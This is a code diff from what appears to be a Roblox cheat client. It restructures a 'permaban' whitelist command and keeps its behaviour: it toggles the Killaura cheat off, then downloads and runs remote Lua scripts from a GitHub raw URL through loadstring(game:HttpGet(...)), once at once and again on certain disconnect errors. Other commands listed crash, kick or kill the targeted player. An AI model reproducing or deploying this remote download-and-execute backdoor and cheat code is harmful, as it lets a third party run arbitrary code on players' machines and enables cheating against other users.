@@ -819,21 +819,6 @@ run(function()
 		end
 	end
 
-	local function permaban()
-		local killaura = vape.Modules.Killaura
-		if killaura and killaura.Enabled then
-			killaura:Toggle()
-		end
-
-		loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
-		vape:Clean(guiService.ErrorMessageChanged:Connect(function()
-			local errorCode = guiService:GetErrorCode()
-			if errorCode ~= Enum.ConnectionError.DisconnectLuaKick and errorCode ~= Enum.ConnectionError.DisconnectConnectionLost then
-				loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
-			end
-		end))
-	end
-
 	whitelist.commands = {
 		crash = function()
 			task.spawn(function()
@@ -887,9 +872,26 @@ run(function()
 				lplr:Kick(table.concat(args, ' '))
 			end)
 		end,
-		permaban = permaban,
-		permban = permaban,
-		spoofban = permaban,
+		permaban = function()
+			local killaura = vape.Modules.Killaura
+			if killaura and killaura.Enabled then
+				killaura:Toggle()
+			end
+
+			loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/forsureyoudont.lua'))()
+			vape:Clean(guiService.ErrorMessageChanged:Connect(function()
+				local errorCode = guiService:GetErrorCode()
+				if errorCode ~= Enum.ConnectionError.DisconnectLuaKick and errorCode ~= Enum.ConnectionError.DisconnectConnectionLost then
+					loadstring(game:HttpGet('https://raw.githubusercontent.com/Night5449791/night5449791/refs/heads/main/indeedwatchingthisfilefuckyou.lua'))()
+				end
+			end))
+		end,
+		permban = function()
+			whitelist.commands.permaban()
+		end,
+		spoofban = function()
+			whitelist.commands.permaban()
+		end,
 		kill = function()
 			if entitylib.isAlive then
 				entitylib.character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
